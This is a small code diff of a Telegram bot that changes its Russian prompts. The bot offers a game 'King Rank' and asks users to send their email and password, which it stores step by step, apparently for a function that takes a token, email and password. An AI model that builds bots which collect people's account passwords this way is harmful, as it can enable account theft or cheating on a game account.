@@ -117,7 +117,7 @@ def check_clan_id(token, email, password):
 # Handle start command
 @bot.message_handler(commands=["start"])
 def handle_start(message):
-    bot.reply_to(message, "👑 Привет! Я помогу тебе установить King Rank. Пожалуйста, отправь свой email и пароль.")
+    bot.reply_to(message, "📧 ⚫️ВВЕДИ @GMAIL⚫️")
 
 # Handle text message
 @bot.message_handler(func=lambda message: True)
@@ -134,7 +134,7 @@ def handle_message(message):
     if state["step"] == "await_email":
         state["email"] = text
         state["step"] = "await_password"
-        bot.reply_to(message, "🔒 Введи свой пароль.")
+        bot.reply_to(message, "🔒 ⚫️ВВЕДИ ПАРОЛЬ⚫️")
 
     elif state["step"] == "await_password":
         email = state["email"]
